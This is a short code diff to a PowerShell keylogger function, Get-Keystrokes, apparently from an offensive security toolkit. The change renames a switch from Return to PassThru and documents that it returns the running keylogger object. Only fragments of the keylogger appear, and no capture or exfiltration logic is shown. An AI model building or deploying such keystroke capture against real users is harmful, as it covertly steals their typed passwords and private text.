@@ -19,6 +19,10 @@ function Get-Keystrokes {
 
     Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.
 
+.PARAMETER PassThru
+
+    Returns the keylogger's PowerShell object, so that it may manipulated (disposed) by the user; primarily for testing purposes.
+
 .EXAMPLE
 
     Get-Keystrokes -LogPath C:\key.log
@@ -43,7 +47,7 @@ function Get-Keystrokes {
         [Double]$Timeout,
 
         [Parameter()]
-        [Switch]$Return
+        [Switch]$PassThru
     )
 
     $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
@@ -368,5 +372,5 @@ function Get-Keystrokes {
     # Start KeyLogger
     [void]$PowerShell.BeginInvoke()
 
-    if ($Return.IsPresent) { return $PowerShell }
+    if ($PassThru.IsPresent) { return $PowerShell }
 }
